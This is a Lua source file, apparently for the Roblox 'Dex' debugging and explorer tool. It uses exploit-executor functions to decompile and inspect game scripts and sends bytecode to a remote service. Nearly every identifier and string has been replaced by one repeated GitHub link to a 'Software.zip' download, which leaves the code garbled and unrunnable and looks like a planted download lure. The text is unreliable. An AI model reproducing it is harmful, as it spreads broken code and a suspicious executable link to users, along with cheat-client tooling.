Main = (function()
	local Main = {}
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {"Explorer","Properties","ScriptViewer"}
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "" -- Beta 1.0.0
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = plr:GetMouse()
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = Apps
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {
		SideWindow = 8,
		Window = 10,
		Menu = 100000,
		Core = 101000
	}
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		return {
			Main = Main,
			Lib = Lib,
			Apps = Apps,
			Settings = Settings,
			
			API = API,
			RMD = RMD,
			env = env,
			service = service,
			plr = plr,
			create = create,
			createSimple = createSimple
		}
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(str)
		if rconsoleprint then
			rconsoleprint("DEX ERROR: "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(str).."\n")
			wait(9e9)
		else
			error(str)
		end
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(name)
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then -- If you don't have filesystem api then ur outta luck tbh
			local control
			
			if EmbeddedModules then -- Offline Modules
				control = EmbeddedModules[name]()
				
				if not control then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Missing Embedded Module: "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end
			end
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name] = control
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip())

			local moduleData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			Apps[name] = moduleData
			return moduleData
		else
			local module = script:WaitForChild("Modules"):WaitForChild(name,2)
			if not module then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("CANNOT FIND MODULE "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end
			
			local control = require(module)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name] = control
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip())
			
			local moduleData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			Apps[name] = moduleData
			return moduleData
		end
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
			local s,e = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,v)
			if not s then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("FAILED LOADING " + v + " CAUSE " + e)
			end
		end
		
		-- Init Major Apps and define them in modules
		Explorer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		Properties = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		ScriptViewer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		Notebook = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local appTable = {
			Explorer = Explorer,
			Properties = Properties,
			ScriptViewer = ScriptViewer,
			Notebook = Notebook
		}
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(appTable)
		for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
			local control = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[v]
			if control then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(appTable)
			end
		end
	end

    https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
        setmetatable(env, {__newindex = function(self, name, func)
            if not func then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1] = name return end
            rawset(self, name, func)
        end})

        -- file
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = readfile
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = writefile
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = appendfile
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = makefolder
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = listfiles
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = loadfile
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = movefileas
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = saveinstance

        -- debug
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (debug and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or getupvalues or getupvals
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (debug and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or getconstants or getconsts
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (debug and (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)) or getinfo
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = islclosure or is_l_closure or is_lclosure
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = checkcaller
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = getreg
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = getgc or get_gc_objects
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = crypt and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = getscriptbytecode

        -- other
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = setfflag
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (syn and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or (http and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or http_request or (fluxus and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or request
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = decompile or (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and function(scr)
            local s, bytecode = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, scr)
            if not s then
                return "failed to get bytecode " .. tostring(bytecode)
            end

            local response = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({
                Url = "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({
                    version = 5,
                    bytecode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(bytecode)
                })
            })

            local decoded = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
            if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= "ok" then
                return "decompilation failed: " .. tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
            end

            return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
        end)
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = protect_gui or (syn and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = gethui or get_hidden_gui
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = setclipboard or toclipboard or set_clipboard or (Clipboard and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = getnilinstances or get_nil_instances
        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = getloadedmodules

        -- if identifyexecutor and type(identifyexecutor) == "function" then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = identifyexecutor() end

        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or plr:FindFirstChildWhichIsA("PlayerGui")

        setmetatable(env, nil)
    end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local s,data = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or error,"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip")
		if s and data and data ~= "" then
			local s,decoded = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(data)
			if s and decoded then
				for i,v in next,decoded do
					
				end
			else
				-- TODO: Notification
			end
		else
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local function recur(t,res)
			for set,val in pairs(t) do
				if type(val) == "table" and val._Recurse then
					if type(res[set]) ~= "table" then
						res[set] = {}
					end
					recur(val,res[set])
				else
					res[set] = val
				end
			end
			return res
		end
		recur(DefaultSettings,Settings)
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local api,rawAPI
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then
				local localAPI = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip")
				if localAPI then 
					rawAPI = localAPI
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1] = ""
				end
			end
			rawAPI = rawAPI or game:HttpGet("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip")
		else
			if script:FindFirstChild("API") then
				rawAPI = require(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			else
				error("NO API EXISTS")
			end
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = rawAPI
		api = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(rawAPI)
		
		local classes,enums = {},{}
		local categoryOrder,seenCategories = {},{}
		
		local function insertAbove(t,item,aboveItem)
			local findPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(t,item)
			if not findPos then return end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(t,findPos)

			local pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(t,aboveItem)
			if not pos then return end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(t,pos,item)
		end
		
		for _,class in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
			local newClass = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then for c,tag in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[tag] = true end end
			for __,member in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				local newMember = {}
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ={}
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then for c,tag in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[tag] = true end end
				
				local mType = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				if mType == "Property" then
					local propCategory = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "Other"
					propCategory = propCategory:match("^%s*(.-)%s*$")
					if not seenCategories[propCategory] then
						categoryOrder[#categoryOrder+1] = propCategory
						seenCategories[propCategory] = true
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = propCategory
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,newMember)
				elseif mType == "Function" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					for c,param in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,{Name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Type = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip})
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,newMember)
				elseif mType == "Event" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
					for c,param in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,{Name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Type = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip})
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,newMember)
				end
			end
			
			classes[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = newClass
		end
		
		for _,class in pairs(classes) do
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = classes[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
		end
		
		for _,enum in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
			local newEnum = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then for c,tag in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[tag] = true end end
			for __,item in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				local newItem = {}
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,newItem)
			end
			
			enums[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = newEnum
		end
		
		local function getMember(class,member)
			if not classes[class] or not classes[class][member] then return end
	        local result = {}
	
	        local currentClass = classes[class]
	        while currentClass do
	            for _,entry in pairs(currentClass[member]) do
	                result[#result+1] = entry
	            end
	            currentClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	        end
	
	        https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(result,function(a,b) return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end)
	        return result
		end
		
		insertAbove(categoryOrder,"Behavior","Tuning")
		insertAbove(categoryOrder,"Appearance","Data")
		insertAbove(categoryOrder,"Attachments","Axes")
		insertAbove(categoryOrder,"Cylinder","Slider")
		insertAbove(categoryOrder,"Localization","Jump Settings")
		insertAbove(categoryOrder,"Surface","Motion")
		insertAbove(categoryOrder,"Surface Inputs","Surface")
		insertAbove(categoryOrder,"Part","Surface Inputs")
		insertAbove(categoryOrder,"Assembly","Surface Inputs")
		insertAbove(categoryOrder,"Character","Controls")
		categoryOrder[#categoryOrder+1] = "Unscriptable"
		categoryOrder[#categoryOrder+1] = "Attributes"
		
		local categoryOrderMap = {}
		for i = 1,#categoryOrder do
			categoryOrderMap[categoryOrder[i]] = i
		end
		
		return {
			Classes = classes,
			Enums = enums,
			CategoryOrder = categoryOrderMap,
			GetMember = getMember
		}
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local rawXML
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then
				local localRMD = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip")
				if localRMD then 
					rawXML = localRMD
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1] = ""
				end
			end
			rawXML = rawXML or game:HttpGet("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip")
		else
			if script:FindFirstChild("RMD") then
				rawXML = require(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			else
				error("NO RMD EXISTS")
			end
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = rawXML
		local parsed = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(rawXML)
		local classList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].children[1].children
		local enumList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].children[2].children
		local propertyOrders = {}
		
		local classes,enums = {},{}
		for _,class in pairs(classList) do
			local className = ""
			for _,child in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Properties" then
					local data = {Properties = {}, Functions = {}}
					local props = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					for _,prop in pairs(props) do
						local name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						name = name:sub(1,1):upper()https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(2)
						data[name] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].text
					end
					className = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					classes[className] = data
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "ReflectionMetadataProperties" then
					local members = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					for _,member in pairs(members) do
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "ReflectionMetadataMember" then
							local data = {}
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].tag == "Properties" then
								local props = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].children
								for _,prop in pairs(props) do
									if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
										local name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
										name = name:sub(1,1):upper()https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(2)
										data[name] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].text
									end
								end
								if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
									local orders = propertyOrders[className]
									if not orders then orders = {} propertyOrders[className] = orders end
									orders[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
								end
								classes[className].Properties[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = data
							end
						end
					end
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "ReflectionMetadataFunctions" then
					local members = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					for _,member in pairs(members) do
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "ReflectionMetadataMember" then
							local data = {}
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].tag == "Properties" then
								local props = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].children
								for _,prop in pairs(props) do
									if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
										local name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
										name = name:sub(1,1):upper()https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(2)
										data[name] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].text
									end
								end
								classes[className].Functions[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = data
							end
						end
					end
				end
			end
		end
		
		for _,enum in pairs(enumList) do
			local enumName = ""
			for _,child in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Properties" then
					local data = {Items = {}}
					local props = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					for _,prop in pairs(props) do
						local name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						name = name:sub(1,1):upper()https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(2)
						data[name] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].text
					end
					enumName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					enums[enumName] = data
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "ReflectionMetadataEnumItem" then
					local data = {}
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].tag == "Properties" then
						local props = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].children
						for _,prop in pairs(props) do
							local name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							name = name:sub(1,1):upper()https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(2)
							data[name] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].text
						end
						enums[enumName].Items[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = data
					end
				end
			end
		end
		
		return {Classes = classes, Enums = enums, PropertyOrders = propertyOrders}
	end

    https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(gui)
        if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
            https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
        elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
            https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(gui)
            https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
        else
            https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
        end
    end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(initStatus) -- TODO: Must theme and show errors
		local gui = create({
			{1,"ScreenGui",{Name="Intro",}},
			{2,"Frame",{Active=true,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BorderSizePixel=0,Name="Main",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,-175,0.5,-100),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,350,0,200),}},
			{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BorderSizePixel=0,ClipsDescendants=true,Name="Holder",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),}},
			{4,"UIGradient",{Parent={3},Rotation=30,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,0),}),}},
			{5,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=4,Name="Title",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-190,0,15),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,50),Text="Dex",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=50,TextTransparency=1,}},
			{6,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Desc",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-230,0,60),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,180,0,25),Text="Ultimate Debugging Suite",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=18,TextTransparency=1,}},
			{7,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="StatusText",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,110),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,180,0,25),Text="Fetching API",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextTransparency=1,}},
			{8,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BorderSizePixel=0,Name="ProgressBar",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,110,0,145),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,4),}},
			{9,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2392156869173,0.56078433990479,0.86274510622025),BorderSizePixel=0,Name="Bar",Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,0),}},
			{10,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://2764171053",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),Parent={8},ScaleType=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(2,2,254,254),}},
			{11,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Creator",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-110,1,-20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,105,0,20),Text="Developed by Moon",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextXAlignment=1,}},
			{12,"UIGradient",{Parent={11},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,0),}),}},
			{13,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Version",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-110,1,-35),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,105,0,20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextXAlignment=1,}},
